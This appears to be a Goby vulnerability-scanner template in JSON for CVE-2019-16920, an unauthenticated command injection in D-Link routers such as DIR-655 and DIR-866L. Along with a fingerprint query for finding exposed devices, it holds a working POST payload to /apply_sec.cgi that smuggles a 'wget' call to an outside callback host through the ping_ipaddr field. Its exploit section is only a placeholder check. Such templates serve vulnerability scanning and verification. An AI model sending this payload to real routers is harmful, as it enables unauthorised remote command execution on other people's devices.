{
      "Name": "Dlink RCE CVE-2019-16920",
      "Level": "3",
      "Tags": [
            "rce"
      ],
      "GobyQuery": "(app=\"D_Link-Router\" | body=\"DIR-655\" | body=\"DIR-866L\" | body=\"DIR-652\" | body=\"DHP-1565\")",
      "Description": "Unauthenticated remote code execution occurs in D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565. The issue occurs when the attacker sends an arbitrary input to a \"PingTest\" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these are also affected: DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.",
      "Product": "Dlink",
      "Homepage": "http://www.dlink.com.cn/",
      "Author": "aetkrad",
      "Impact": "",
      "Recommendation": "",
      "References": [
            "https://www.anquanke.com/post/id/187923"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/apply_sec.cgi",
                        "follow_redirect": false,
                        "header": {
                              "Content-Type": "application/x-www-form-urlencoded"
                        },
                        "data_type": "text",
                        "data": "html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://{{{check}}}",
                        "set_variable": [
                              "check|dnslog|4|15"
                        ]
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$reserver",
                                    "operation": "contains",
                                    "value": "{{{check}}}",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/test.php",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "test",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "2021-11-25 18:14:25",
      "GobyVersion": "1.9.310"
}